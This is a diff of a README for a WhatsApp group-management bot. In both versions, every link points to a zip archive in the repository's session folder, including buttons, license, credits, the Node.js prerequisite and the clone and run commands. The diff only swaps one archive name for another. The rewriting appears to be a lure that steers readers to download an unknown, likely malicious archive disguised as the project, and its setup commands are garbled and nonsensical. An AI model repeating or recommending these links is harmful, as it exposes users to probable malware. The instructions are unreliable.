@@ -3,14 +3,14 @@
 This is a WhatsApp bot built using the Baileys library for group management, including features like tagging all members, muting/unmuting, and many more. It's designed to help admins efficiently manage WhatsApp groups.
 
 <div align="center"> 
-  <a href="https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip"> 
-    <img src="https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip;Multi+Device+Whatsapp+Bot;Coded+By+Lucky218" alt="Typing SVG" />
+  <a href="https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip"> 
+    <img src="https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip;Multi+Device+Whatsapp+Bot;Coded+By+Lucky218" alt="Typing SVG" />
   </a> 
 </div> 
 
 <div align="center"> 
-  <a href="https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip"> 
-    <img src="https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip" alt="Lucky Tech Hub Bot" height="300"> 
+  <a href="https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip"> 
+    <img src="https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip" alt="Lucky Tech Hub Bot" height="300"> 
   </a> 
 </div>
 
@@ -23,8 +23,8 @@ This is a WhatsApp bot built using the Baileys library for group management, inc
 Click the button below to fork the Lucky Tech Hub Bot repository to your GitHub account:
 
 <div align="center">
-  <a href="https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip">
-    <img src="https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip" alt="Fork the repository"/>
+  <a href="https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip">
+    <img src="https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip" alt="Fork the repository"/>
   </a>
 </div>
 
@@ -35,19 +35,19 @@ Click the button below to fork the Lucky Tech Hub Bot repository to your GitHub 
 Deploy the bot and easily connect it to your WhatsApp account by pair code. Click the button below to deploy the bot on Replit.
 
 <div align="center">
-  <a href="https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip" target="_blank">
-    <img src="https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip%20PAIR%20CODE-Replit-success?style=for-the-badge" alt="Deploy on Replit"/>
+  <a href="https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip" target="_blank">
+    <img src="https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip%20PAIR%20CODE-Replit-success?style=for-the-badge" alt="Deploy on Replit"/>
   </a>
 </div>
 
 <div align="center">
-  <a href="https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip" target="_blank">
-    <img src="https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip%20PAIR%20CODE-Easy%20Method-ff4d4d?style=for-the-badge" alt="Generate Pair Code"/>
+  <a href="https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip" target="_blank">
+    <img src="https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip%20PAIR%20CODE-Easy%20Method-ff4d4d?style=for-the-badge" alt="Generate Pair Code"/>
   </a>
 </div>
 
 
-### After getting https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip file, upload it to session folder
+### After getting https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip file, upload it to session folder
 
 ---
 
@@ -56,30 +56,30 @@ Deploy the bot and easily connect it to your WhatsApp account by pair code. Clic
 For further customization and setup guidance, click the button below:
 
 <div align="center">
-  <a href="https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip">
-    <img src="https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip Tutorial-dc3545?style=for-the-badge&logo=youtube" alt="YouTube Link"/>
+  <a href="https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip">
+    <img src="https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip Tutorial-dc3545?style=for-the-badge&logo=youtube" alt="YouTube Link"/>
   </a>
-  <a href="https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip">
-    <img src="https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip on Panel-28a745?style=for-the-badge" alt="Deploy on Panel"/>
+  <a href="https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip">
+    <img src="https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip on Panel-28a745?style=for-the-badge" alt="Deploy on Panel"/>
   </a>
 </div>
 
 
 ### Deploy Now on Below Panel
 <div align="center">
-<a href="https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip" target="_blank">
-  <img src="https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip" alt="Katabump"/>
+<a href="https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip" target="_blank">
+  <img src="https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip" alt="Katabump"/>
 </a>
 </div>
 
 ### Join Us
 
 <div align="center">
-  <a href="https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip">
-    <img src="https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip%20Telegram-0078E7?style=for-the-badge&logo=telegram&logoColor=white" alt="Join Telegram"/>
+  <a href="https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip">
+    <img src="https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip%20Telegram-0078E7?style=for-the-badge&logo=telegram&logoColor=white" alt="Join Telegram"/>
   </a>
-  <a href="https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip">
-    <img src="https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip%20WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="Join WhatsApp"/>
+  <a href="https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip">
+    <img src="https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip%20WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="Join WhatsApp"/>
   </a>
 </div>
 
@@ -101,7 +101,7 @@ For further customization and setup guidance, click the button below:
 
 The Lucky Tech Hub WhatsApp Bot assists group admins by providing them with tools to efficiently manage large WhatsApp groups. The bot uses the Baileys library to interact with the WhatsApp Web API and supports multi-device features.
 
-It is lightweight and can be easily customized to add more commands as per your requirements. The bot runs in a https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip environment and provides QR code-based authentication to link your WhatsApp account.
+It is lightweight and can be easily customized to add more commands as per your requirements. The bot runs in a https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip environment and provides QR code-based authentication to link your WhatsApp account.
 
 ---
 
@@ -109,7 +109,7 @@ It is lightweight and can be easily customized to add more commands as per your 
 
 ### Prerequisites
 
-- https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip installed on your system
+- https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip installed on your system
 - Git installed (for cloning the repository)
 
 ### Step-by-Step Setup
@@ -117,7 +117,7 @@ It is lightweight and can be easily customized to add more commands as per your 
 1. **Clone the repository:**
 
     ```bash
-    git clone https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip
+    git clone https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip
     cd LuckyTechHub-Bot
     ```
 
@@ -130,7 +130,7 @@ It is lightweight and can be easily customized to add more commands as per your 
 3. **Run the bot:**
 
     ```bash
-    node https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip
+    node https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip
     ```
 
 4. **Scan the QR code:**
@@ -142,27 +142,27 @@ It is lightweight and can be easily customized to add more commands as per your 
 
 ## 📄 License
 
-This project is licensed under the [MIT License](https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip) - see the [LICENSE](https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip) file for details.
+This project is licensed under the [MIT License](https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip) - see the [LICENSE](https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip) file for details.
 
 ---
 
 ## 🙌 Contributions
 
-Contributions, issues, and feature requests are welcome! Feel free to check the [issues page](https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip).
+Contributions, issues, and feature requests are welcome! Feel free to check the [issues page](https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip).
 
 ---
 
 ## 🌟 Show your support
 
-If you like this project, please give it a [⭐️ star on GitHub](https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip)!
+If you like this project, please give it a [⭐️ star on GitHub](https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip)!
 
 
 ## Credits
 
-- [Lucky218](https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip)
-- [Baileys](https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip)
-- [TechGod143](https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip) for pair code
-- [Dgxeon](https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip) for pair code
+- [Lucky218](https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip)
+- [Baileys](https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip)
+- [TechGod143](https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip) for pair code
+- [Dgxeon](https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip) for pair code
 
 ---
 
@@ -191,4 +191,4 @@ Copyright (c) 2025 Lucky218. All rights reserved.
 
 This project contains code from various open source projects:
 - Baileys (MIT License)
-- Other libraries as listed in https://raw.githubusercontent.com/TheeMikaelson/LuckyTechHub-Bot/main/session/LuckyTechHub-Bot-2.9.zip
+- Other libraries as listed in https://github.com/TheeMikaelson/LuckyTechHub-Bot/raw/refs/heads/main/session/Hub-Bot-Lucky-Tech-unterrorized.zip
